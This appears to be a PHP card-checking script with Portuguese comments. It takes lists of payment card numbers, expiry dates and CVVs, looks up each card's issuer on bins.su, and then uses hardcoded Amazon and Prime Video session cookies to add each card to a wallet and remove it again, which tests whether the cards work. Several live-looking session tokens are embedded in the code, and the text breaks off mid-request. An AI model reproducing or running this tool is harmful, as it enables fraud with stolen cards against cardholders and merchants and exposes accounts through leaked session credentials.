<?php

#############################################
error_reporting(0);
set_time_limit(0);


#############################################
/*
API DESENVOLVIDA POR @pladixoficial e COPIADA DE SHARK7 O MAIOR USUARIO DE ALLBINS DO MUNDO OU PIOR CODI DO 7
*/
date_default_timezone_set('America/Sao_Paulo');

DeletarCookies();
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function deletarCookies() {
    if (file_exists("cookie.txt")) {
        unlink("cookie.txt");
    }
}


function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];
$time = time();


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}


switch ($ano) { 
         case '22':$mes = '2022';break; 
         case '23':$ano = '2023';break; 
         case '24':$ano = '2024';break; 
         case '25':$ano = '2025';break; 
         case '26':$ano = '2026';break; 
         case '27':$ano = '2027';break; 
         case '28':$ano = '2028';break; 
         case '29':$ano = '2029';break; 
         case '30':$ano = '2030';break; 
         case '31':$ano = '2031';break; 
         case '32':$ano = '2032';break; 
}


$bin = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://bins.su/");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Host: bins.su'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_POST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=searchbins&bins='.$bin.'&bank=&country=');
$dados1 = curl_exec($ch);

$bin = GetStr($dados1, 'bins<table><tr><td>BIN</td><td>Country</td><td>Vendor</td><td>Type</td><td>Level</td><td>Bank</td></tr><tr><td>','</td><td>' , 1);
$pais = GetStr($dados1, '<tr><td>'.$bin.'</td><td>','</td><td>' , 1);
$bandeira = GetStr($dados1, '</td><td>'.$pais.'</td><td>','</td><td>' , 1);
$tipo = GetStr($dados1, '</td><td>'.$bandeira.'</td><td>','</td><td>' , 1);
$nivel = GetStr($dados1, '</td><td>'.$tipo.'</td><td>','</td><td>' , 1);
$banco = GetStr($dados1, '</td><td>'.$nivel.'</td><td>','</td></tr>' , 1);

$bin = "$bandeira $banco $level $tipo $pais";

   
//cookie1 = primevideo

//$cookie1 = 'session-id=140-3991911-7100821; i18n-prefs=USD; lc-main-av=pt_BR; av-timezone=America/Sao_Paulo; ubid-main-av=133-1030542-0805938; session-token=TkcvZ2NyjFHISWIIVTLT8UNhliqaqJgfEFntQgyFJ8zN57Es4FVEh4JQFxgfueuT8dgygvOZt9JEFMXHoeLu0PkgcNpJ8gYWZFC8Cy18o8D3aMKb5MDz2WW3uSh8rUXQm2hLBaCvBdGlCF8dI7jwE6976XH6JIqKrB81qk2NuVMLR8mHeeUyx215Y8rSJlhEvnGTaq0ALes14WahK3mIu7KZ+8nEb1wN3jjPNHwHctSiO6/bxbOAxiCZjUlEjZ7T; x-main-av="1GRVlcoCfnmpfljtQI3xAmSL6aLS2@yxvP2AKB26aTVMlhBd38pmK4tbT1CxYBNU"; at-main-av=Atza|IwEBIDDSYMsXP4bYa9WVFLOaZJb-PAdnjD83gQZf-YZ29J2NtMxGOsb56sKLd2hLDM62cI77xYI1gPSJIECN2AEKxXpubxOMXlTTmC6yx35j7Zp3l1SbtaySsqVyh4afOVxg_zX38a-Z_RfHejmvU-lYC5b8qRiBwyL-oswOeqarNTC825roX-ChlxSQzlDsoUYvYzcpFIvyXpr2yjYMsAVGSuUgK2muaOaQdYAdu0mWETJz_uNntZdg6BpMJIkbQMtp2HU; sess-at-main-av="+c3qvMKWKzaoZVEAvtdOnQPOmSvmH3C3z+/lbr/iIhY="; session-id-time=2082787201l; csm-hit=adb:adblk_no&t:1673314238452&tb:0GNSCJPE6BC0CQAGW2QH+s-H155BJMZ26EAFF03XHDN|1673314238452';
//$cookie1 = 'session-id=140-3991911-7100821; i18n-prefs=USD; lc-main-av=pt_BR; av-timezone=America/Sao_Paulo; ubid-main-av=133-1030542-0805938; session-token=spC85weDy0N1UNcIgFLHxnbAB4dt2gAbBJ6HxCDnUScjbLBFqBf5dVsqK8yn9EjxmN6vPg9fCyONPhVXtbYSNSEOMLO2z1KIRQtfx3qrPN/C4di9npCQ2LVg7G3mfOvitnbyQlaVrGcTzYmaacey+bfhXi3BzcVOX0u4nxDUCEKbdPTBXWIZQVt2Q2bh0UkzEOfLkgMzO4TSpzVM6OtAxFKK8FNwIDm+CODf5aHvBAhn2pOIS/ysCRm7I1POHSUn; x-main-av="i96TH6uYOQf68X1@rsdZGzdGPvvH9Lyq?km?61iQlgYe2x56sPn43YdLx?QBcgOT"; at-main-av=Atza|IwEBIC8d9DX5WHM_7bsSSD7qDR2cuPj9-aQdNsYvyS77MfaroINiJRbsoDQSb956jQ3wu20HgpyUEVaskBYUT5JexZBLFk6QY5vans5krbLHyOe0KzsvQVGL64C_vV1sTyX-NufpQHWePZhi7vfmlNr8MepWqCfUBUvGLeQxupMzzCBheLh0mMsThKXQ5SiGffKnRcp20Mi2P2JTFdJu7PFkXcFttlL51OWGbkHuQhS0sPoAVKXOPBzo364RhXragvcZUJ0; sess-at-main-av="9Sc1njzufsNgY/Ly26p28xNTJy+aZQanUyxaqnS+w5k="; session-id-time=2082787201l; csm-hit=adb:adblk_no&t:1673318788145&tb:0GNSCJPE6BC0CQAGW2QH+s-4WA3NFQ5EEC5R4GHVVCY|1673318788145';
$cookie1 = 'session-id=141-5212410-2626945;i18n-prefs=USD;lc-main-av=pt_BR;ubid-main-av=133-6585062-5482923;av-timezone=America/Sao_Paulo;x-main-av="9Sv2aTJzmaMMON891mGLD3ZGkO82jyJk2?X2V84WhdxAcrX6AbUfzpZwL9GoJ6uv";at-main-av=Atza|IwEBIMNTnCr8rk5_uHUV2aGfLoP0yPK-or7fMGxKYgbnKoAeuk6JNUXzjUYVzT9m20nQIeMWDn21t4Pzr2VhxkG-c4aq78RKZtR8DU5lSHt2rk04VLsK06xQmh8T4mtboUj047t0avWxPYTmaY4RYOni49pFUaEzAbfE47P29rL8hBvLYgO7lddUlQjJN0L_0RDWYn07NVkxM9GdR69xXaqd67hcuIq76AdIqjHXEKiitKjLcnYZ9r2r8UVdKLjNAx7otyQ;sess-at-main-av="HcXtmTUWjCgFEK1PwVR78sFkwnOOKzgVd+f6qkXdjaw=";session-token="wkfakpUTnFKCNCZn5usVH+hTWQTWEtBYn2+HqiG5R+ru97eHzbop3DUQbwZjsew+DdgktYAubdDZspvP7EbLRuyK4CgqMcGIT/kWe/0OysvXtsynoPk1jTM9sSjwFf7MbVYK9ORGDX9P0kGS25PtzUfOr/ur9MT0E44pGm17QulK6BTh1jzO+/VB66ZTI52autGLnTCy8fPDT7Lwx06XGg/pH5k3s7AxgDLfgaAZ/+wVT7xOoGmEEv3JXLclA6DyqsAGVgqsWA4=";session-id-time=2082787201l;csm-hit=tb:88AKGFT89653W5XKB233+s-5ARV6M3M6JDSHPY2WM1F|1673366846406&t:1673366846406&adb:adblk_no';

//cookie2 = amazon

//$cookie2 = 'session-id=147-8139620-5886110; ubid-acbbr=135-4881757-0371834; sst-acbbr=Sst1|PQEIX96wV38XsQ2bm9WKLYY0CVos2mmrE2BhWEsc42Yw-kt941CLb2rPjX1-IP2VFPgCIOJ0n_iAFKfUgRT99A6lvTyvVwguH3g9sQ3ykXT8MjVHBUnxebkDRFRVf6jhmXb8TWN1o6xhLEUSvBrwPUSTviDsnRHfTQxxF2rCYXci77DMpp3yxB0dSVUY6UEPNJFwYBWOAgPiJ3LVQwpA2-GPQNKbcje7rInneyb-AV9ZTNV9jsOCUxVb-EuzwZ768M6T81dUcEpxyFjXUJ5ESJvA3OMunjTlfQGkODZneCmLWTA; lc-acbbr=pt_BR; i18n-prefs=BRL; session-id-time=2304033798l; session-token=i1VVaIQw1gR3lT8FQzfr5xD7P1QCZmsXoaOLuL5EGU1uOsVTgMUZsRubRdhKo9fwppwjSAqxYU4Di1a1MpY4WMq/DP1+sp2Db3XFDZHxksogjDaAwXyKYI2y4tw9Kf0jeF/I7jstwiVE7nnW8aClUIYDA3OOh2kUzRLJ2oBdwtDCHIEMkQt4Nub1XfdAuUXrjUrchU5h72UJ1QJwrrDD9cPU/zHHSqOXtGDOjyhxpGXZG1ZCe1XNV4cJdYL6egJd; x-acbbr="PSfPU0Mp2BJOn4qirZTthRGQ4KJoZ@NHs0yb6spP1oB2nEl2ePAhR0@yMIeyP3rG"; at-acbbr=Atza|IwEBINbfWx0utCYLohYfzY-tHWzuEE6wBiHaomJGRUqiQZZdijHpaOjA2yPMYDSCSca8dpG0AoX9cZ9PncAc3WLwGCtOOh05g3kzeDzCBuoppppw-701Lqrji6w7FLlPsuZXqYm4MU4U3k1A7PfgpFtiztIBuTZqUAZAi5sKI0UdNDjll9mvThvPFsodaQrviAzS5Ti_LPxWFqUye9-SP9tX1THL; sess-at-acbbr="chGnlfNtbN59MmckuxDzJuNwJ4aM3118sIV6bhrGdww="; csm-hit=tb:71H3T187T9P42TZTRH1C+s-71H3T187T9P42TZTRH1C|1673314206487&t:1673314206487&adb:adblk_no';
//$cookie2 = 'session-id=147-8139620-5886110; ubid-acbbr=135-4881757-0371834; lc-acbbr=pt_BR; session-token=kiYqXSIiKB7JbF7MsCkE8qqkbJxzCGnJYI1JBL5vVCewfzCXAOABj6+A9hQKKn1pEfewoEWhuCFE8NB4iRqoDPGBRU6GG6SUPSejlbocMjCbfrU+++jBCHcBWC/qg4AJfXWSrtcrbiDD7ilG+2GZumzeUKPsq76hWgAzr5Y6OFDlHgCe8+DH8BTveqH5mFVCqh5Mv/mYktsonivAD6nFF1bCyzOka9GTDZEOzOyGPrD1OMgKgsVoUP8IEeH8YORi; x-acbbr="raSh4CQF9HsAwqm64jQLHHchpLx6aW1fRs0g6KIKaeYB@?2Hit6sT5GZTIcR2Nfb"; at-acbbr=Atza|IwEBIE9Je4eVQlp7-oNFmXpsSZ4ncASkzzEuoyVzekCirftzZ9plOFJN2-xv1zmMKfWJjqoQ6HYTC-nKmbS1181KqKFThxpnZZJyZz97alU_d9BJCAyEI5RFVI0Nucf6qR-0NdOqAeQYze8MvO2D9Dm_VQyUYiXtwb2IbdPCMW5EFyFTWiZ2dEg-5-hjpRPN5lV06EJ0tsVd4loUtO322omI7EhQOHLeVF-1orKnbMHQ46TVyQ; sess-at-acbbr="cOkcR5l1xSohET01I1tieqkuvU6GhAsaY06ZlfgDA5Y="; sst-acbbr=Sst1|PQHKlO5wd3Tc2bXU8f-ODAG4CT34sFm8-YCNyc52neSCw3t4pzQkKmc0xdIz9h2sGAdjMmE6CdNAvbmt8vSL5aIECWz9vKDc7T-QpYlXmGxDBvNULrcRBV-iNokoPCUQRXS7CvLwqOA7Z5rDXWzjZ63gC4nCRzzZxNBqdY6L8VylLMMPSy11gcS5nanIOSb-unSECEFAgDK964odm4AIDM-u-j5359bCGadDUXHutxCUAexcBa8eAvUBAk4ef8DZX0qF2I-dk3zV3b3z5KNg6fx77jlvJD1ghRAFn5UhkqgsnRw; i18n-prefs=BRL; session-id-time=2082787201l; csm-hit=adb:adblk_no&t:1673318632798&tb:6QJK5RR1F6K38DRCK6YC+s-Z5YQ6EW8VEDHZ5Q6ERJS|1673318632798';
$cookie2 = 'session-id=147-7132625-4987014;ubid-acbbr=135-0667867-0474062;lc-acbbr=pt_BR;sst-acbbr=Sst1|PQEgq6eMVbg5LTk8mq7RFPr5CXq6C9bO60dzEloMsaJwKAsvyutjdDrkkT23rRg6xGxl39os9kD3vefkHu6JJqvwoUMrBw9YG7IV2eAdNr1pP2LoqbGXdBlYudjbpqEBvJj84OWv9gXqhLTZPdOkQZ9VYNvowwHQpD44xjoaQiheHaSzZdQWZQmBwW-npqZYgLCUdsTjQK9dirWuFBykOJOm_1MBYPFSSDTOXwv6tbwQSJ87P2tK5_N7syoR6Um2OGTYjvVeh0KrAvJoHoal57keBWZLoKZ2WSKsGO2uaTL5MII;i18n-prefs=BRL;x-acbbr="9Hud@Aj2kI8BeGcjPrih?8hEOQMg5v86JPYHlhX8P8VWrQJRSIZ3KgOe3gdhkBSS";at-acbbr=Atza|IwEBICznQSaTbGXC3aB-ZSLq9J4Es40h3ZJasAdbjWUkgl1h1cqbxWUwdkbBC3rvzhk0d3TvdAH_r2-qMmOo0EpcTABIE3SPpXW_x63tczPecpccYpDQP5NXvLZ5z6ML4vGyrr0bz5wpBXR1IRQvci6h6TGkFNtN2llsXSHvFp9d2vHK81OxfzTIudCT9_eJTfm8wWZ_ngaGz7pt27wmBwcDU298;sess-at-acbbr="XIrs0YB3+hn3jxNBfF/NaxepxeyJc4RvIJlhcHiG+vI=";session-token=PBRzwtizm/RuwIyorxsB4Nwl311cMaQzfWCe3PKYDwU2nCwdGwKQEjXY3Ehwt0QituFoe+NYjGlY9SYg675F6xMTATnnapZWhtqi26KxuG4fU/3TSIKVzt6zeQt4Ea1xyxBUBaJeg3f6EGcSQPT2MCzJeJphgEUCBihMFJsx1oixvlLhsSXOowxIEUD45Xy4fyrBlaaBS2x9zPoOTxNsr9f43AkmcVm5nmYEYUNnMmuXZzkqrybKPl1ZjJTyL07A;session-id-time=2082787201l;csm-hit=s-VQ4D7X4AZFN7FBMGQAS1|1673366993309';

//// url token abaixo 

//$urltoken = "A1M1CE02QOWT1Q";
//$urltoken = "AACX77NNE3NTI";
$urltoken = "A3BBRWIXMUAJHO";

sleep(3);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_a?workflowType=PaymentFixup-TVOD');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 10',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 50',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'Origin: https://www.amazon.com',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo&',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie1"


));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
    $data5 = curl_exec($ch);  





   $token6 = getStr($data5, 'ppw-widgetState" value="','"');
















curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/' .$urltoken .'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 10',
'APX-Widget-Info: Subs:AmazonVideo/desktop/B7MM6W8Hoq1N',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 50',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'Origin: https://www.primevideo.com',
'Referer: https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_e?workflowType=PaymentFixup-TVOD',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie1"


));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AAddCreditCardEvent=&ppw-jsEnabled=true&ppw-widgetState='.$token6.'&ie=UTF-8&ppw-accountHolderName=luciano+franco&addCreditCardNumber='.$cc.'&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'');
 $data1 = curl_exec($ch);





 $token = getStr($data1, 'addressSelection-','\":');















     $token3 = getStr($data1, '"ppw-widgetState\" value=\"','\"');



     $token4 = getStr($data1, 'data-address-id=\"','\"');



   $token5 = getStr($data1, 'customerId\":\"','\"');
curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com/region/na/payments-portal/data/widgets2/v1/customer/' .$urltoken .'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 10',
'APX-Widget-Info: Subs:AmazonVideo/desktop/B7MM6W8Hoq1N',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 50',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'Origin: https://www.primevideo.com',
'Referer: https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_e?workflowType=PaymentFixup-TVOD',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie1"


));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3ASelectAddressEvent=&ppw-jsEnabled=true&ppw-widgetState='.$token3.'&ie=UTF-8&ppw-pickAddressType=Inline&ppw-addressSelection='.$token4.'');
   $data2 = curl_exec($ch);
   
   
   
   
   
   
   
   
   
      $token1 = getStr($data2, 'ppw-widgetState\" value=\"','\"');

   
        $token2 = getStr($data2, 'paymentInstrumentId":"','"');

   
   
   
   curl_setopt($ch, CURLOPT_URL, 'https://www.primevideo.com.br/region/na/payments-portal/data/widgets2/v1/customer/' .$urltoken .'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.primevideo.com',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 3.2',
'APX-Widget-Info: Subs:AmazonVideo/desktop/y4NoL7TC0tFV',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.primevideo.com',
'Referer: https://www.primevideo.com/region/na/gp/video/acquisition/workflow/ref=atv_set_ps_1c_a?workflowType=PaymentFixup-TVOD',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie1"

));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$token1.'&ie=UTF-8&ppw-instrumentRowSelection=instrumentId%3D'.$token2.'%26isExpired%3Dfalse%26paymentMethod%3DCC%26tfxEligible%3Dfalse&ppw-widgetEvent%3APreferencePaymentOptionSelectionEvent=');
     $data3 = curl_exec($ch);
   
            $token8 = getStr($data3, 'YA:Wallet\",\"serializedState\":\"','\"');

   


curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'device-memory: 8',
'sec-ch-device-memory: 8',
'dpr: 1',
'sec-ch-dpr: 1',
'viewport-width: 1920',
'sec-ch-viewport-width: 1920',
'rtt: 100',
'downlink: 10',
'ect: 4g',
'sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'Upgrade-Insecure-Requests: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Service-Worker-Navigation-Preload: true',
'Referer: https://www.amazon.com.br/gp/css/homepage.html?ref_=nav_AccountFlyout_ya',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie2"


));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
     $data15 = curl_exec($ch);  
   
             
			    $token15 = getStr($data15, '":{"selectedInstrumentId":"','"');

   
   			     $token16 = getStr($data15, 'YA:Wallet","serializedState":"','"');

   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
 
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
        curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/' .$urltoken .'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 5.2',
'APX-Widget-Info: YA:Wallet/desktop/fsLWxt0R5eZN',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.amazon.com.br',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie2"

));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$token16.'&ppw-widgetEvent=StartEditEvent&ppw-iid='.$token15.'&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false');
 $data14 = curl_exec($ch);  
   
   
   
   
   
   
   
        $token17 = getStr($data14, 'ppw-widgetState\" value=\"','\"');

   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
         curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/' .$urltoken .'/continueWidget?sif_profile=APX-Encrypt-All-NA');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 5.2',
'APX-Widget-Info: YA:Wallet/desktop/fsLWxt0R5eZN',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.amazon.com.br',
'Referer: https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
"Cookie: $cookie2"


));
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookies.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22'.$token2.'%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Remove+from+wallet&ppw-jsEnabled=true&ppw-widgetState='.$token17.'&ie=UTF-8&ppw-accountHolderName=luciano+jr&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'');
   $data13 = curl_exec($ch);            

   
            $token18 = getStr($data13, 'ppw-widgetState\" value=\"','\"');

   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
      curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.com.br/payments-portal/data/widgets2/v1/customer/' .$urltoken .'/continueWidget');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.amazon.com.br',
'sec-ch-device-memory: 8',
'X-Requested-With: XMLHttpRequest',
'dpr: 1',
'downlink: 5.2',
'APX-Widget-Info: YA:Wallet/desktop/fsLWxt0R5eZN',
'sec-ch-ua-platform: "Windows"',
'device-memory: 8',
'Widget-Ajax-Attempt-Count: 0',
'rtt: 150',
'sec-ch-ua-mobile: ?0',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
'viewport-width: 1920',
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Accept: application/json, text/javascript, */*; q=0.01',
'sec-ch-viewport-width: 1920',
'sec-ch-dpr: 1',
'ect: 4g',
'Origin: https://www.amazon.com.br',
